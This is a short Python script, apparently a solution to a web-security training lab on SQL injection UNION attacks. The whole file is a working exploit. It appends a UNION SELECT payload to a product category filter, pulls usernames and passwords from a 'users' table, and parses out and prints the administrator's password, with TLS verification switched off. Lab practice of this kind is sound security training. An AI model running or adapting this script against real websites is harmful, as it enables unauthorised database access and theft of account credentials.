# Lab: SQLi UNION attack, retrieving data from other tables
import os
import sys
from bs4 import BeautifulSoup
import requests
import urllib3
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION select username, password from users--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("(-> Found the administrator password.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
        print("(-> The administrator password is '%s'" % admin_password)
        return True
    return False


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> Dumping the list of usernames and passwords...")
    if not exploit_sqli_users_table(url):
        print("(-) Did not find an administrator password.")


if __name__ == "__main__":
    main()
